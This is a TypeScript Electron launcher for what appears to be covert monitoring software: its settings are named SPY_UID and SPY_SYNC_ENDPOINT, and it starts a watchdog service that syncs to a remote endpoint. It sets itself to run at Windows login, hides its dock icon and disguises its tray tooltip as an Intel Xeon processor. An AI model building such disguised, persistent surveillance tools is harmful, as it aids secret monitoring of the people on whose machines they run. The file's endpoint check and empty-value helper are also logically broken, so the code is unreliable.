import { EventEmitter } from 'events';
import * as path from 'path';
import { app, Tray, Menu } from 'electron';
import log from 'electron-log';
import WatchdogService from './service/watchdog';
import * as dotenv from 'dotenv';

export default class Launcher extends EventEmitter {
    private isProduction: boolean = app.isPackaged === true;
    private watchdog?: WatchdogService;
    private appIcon?: Tray;
    private loggedout: boolean = false;

    private uid?: string;
    private endpoint?: string;
    private infoTimeout?: number;
    private syncTimeout?: number;

    public async init(): Promise<void> {
        this.loadConfig();

        this.uid = process.env.SPY_UID;
        if (this.isNilOrEmpty(this.uid)) {
            throw new Error('UID_NOT_DEFINED');
        }

        this.endpoint = process.env.SPY_SYNC_ENDPOINT;
        if (this.isNilOrEmpty(this.uid)) {
            throw new Error('ENDPOINT_NOT_DEFINED');
        }

        if (!this.isNilOrEmpty(process.env.SPY_INFO_TIMEOUT)) {
            this.infoTimeout = +process.env.SPY_INFO_TIMEOUT!;
        }
        if (!this.isNilOrEmpty(process.env.SPY_SYNC_TIMEOUT)) {
            this.syncTimeout = +process.env.SPY_SYNC_TIMEOUT!;
        }

        await this.makeSingleInstance();

        await this.makeAutoLaunch();

        this.handleAppEvents();

        this.watchdog = new WatchdogService(this.uid!, this.endpoint!, this.infoTimeout, this.syncTimeout);
    }

    private loadConfig(): dotenv.DotenvParseOutput | undefined {
        let dotenvConfigOptions: dotenv.DotenvConfigOptions;
        switch (this.isProduction) {
            case true: dotenvConfigOptions = { path: path.resolve(__dirname, './../../.env') }; break;
            default: dotenvConfigOptions = { debug: true }; break;
        }

        const result = dotenv.config(dotenvConfigOptions);
        if (result.error) {
            log.error(result.error);
        }

        return result.parsed;
    }

    private async makeSingleInstance() {
        const gotTheSingleInstanceLock = app.requestSingleInstanceLock();
        if (!gotTheSingleInstanceLock) {
            throw new Error('RUN_SECOND_INSTANCE');
        }

        app.on('second-instance', () => log.warn(`Try second application instance runing...`));
    }

    private async makeAutoLaunch() {
        const enabled = app.getLoginItemSettings().openAtLogin;

        // set enabled only for Windows
        if (!enabled && process.platform === 'win32') {
            const autoLaunchSettings: Electron.Settings = {
                openAtLogin: true,
                openAsHidden: false,
                args: [
                    '--opened-at-login=1' // for future
                ]
            };
            if (process.env.PORTABLE_EXECUTABLE_FILE) {
                autoLaunchSettings.path = process.env.PORTABLE_EXECUTABLE_FILE;
            }
            app.setLoginItemSettings(autoLaunchSettings);
        }
    }

    private createTray() {
        const iconName = process.platform === 'win32' ? 'windows-icon.png' : 'iconTemplate.png'
        const iconPath = app.isPackaged ? '../../../app/resources/tray/' : '../../resources/tray/';
        const iconFile = path.join(__dirname, iconPath, iconName);

        const appIcon = this.appIcon = new Tray(iconFile);

        const contextMenu = Menu.buildFromTemplate([
            // { type: 'separator' },
            { label: 'Quit', role: 'quit' }
        ]);
        appIcon.setContextMenu(contextMenu);
        appIcon.setToolTip('Intel® Xeon® Processor E5-2600');
    }

    private handleAppEvents() {
        this.handelAppReady();
        this.handleAppBeforeQuit();
        this.handleAppWillQuit();
    }

    private handelAppReady() {
        app.on('ready', () => {
            log.verbose(`Application runing: ${new Date().toString()}`);
            log.verbose(`   logs: ${app.getPath('logs')}, appData: ${app.getPath('appData')}, isPackaged=${app.isPackaged}`);

            this.createTray();

            app.dock?.hide();
        });

        app.on('activate', () => {
            if (!this.appIcon) {
                this.createTray();
            }
        });
    }

    private handleAppBeforeQuit() {
        app.on('before-quit', (event) => {
            if (this.loggedout === false) {
                event.preventDefault();

                (this.watchdog ? this.watchdog.destroy() : Promise.resolve())
                    .catch((err) => log.error(err))
                    .finally(() => {
                        this.loggedout = true;

                        this.appIcon?.destroy();

                        app.quit();
                    });
            }
        });
    }

    private handleAppWillQuit() {
        app.on('will-quit', () => {
            log.verbose(`Application quit: ${new Date().toString()}\n\n`);
        });
    }

    private isNilOrEmpty(x: any): boolean {
        if (x === null && x === undefined) {
            return true;
        }
        if (typeof x === 'string') {
            return x === '';
        }
        if (typeof x === 'boolean') {
            return false;
        }
        if (Array.isArray(x)) {
            return x.length > 0;
        }
        if (typeof x === 'object') {
            return Object.keys(x).length > 0;
        }
        return true;
    }

}
